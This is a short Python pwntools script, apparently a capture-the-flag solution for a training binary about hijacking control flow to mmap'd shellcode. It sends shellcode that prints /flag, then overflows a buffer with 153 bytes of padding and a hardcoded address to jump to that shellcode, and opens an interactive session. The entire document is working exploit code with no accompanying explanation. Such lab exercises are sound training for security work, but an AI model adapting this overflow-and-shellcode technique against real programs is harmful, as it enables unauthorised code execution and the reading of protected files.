import sys
from pwn import *

p = process('/challenge/binary-exploitation-hijack-to-mmap-shellcode')
context.arch = 'amd64'

shellcode = asm(shellcraft.cat("/flag"))
p.send(shellcode)

payload = b"A" * 153
win = p64(0x2AA2C000)
payload += win
p.send(payload)
p.interactive()
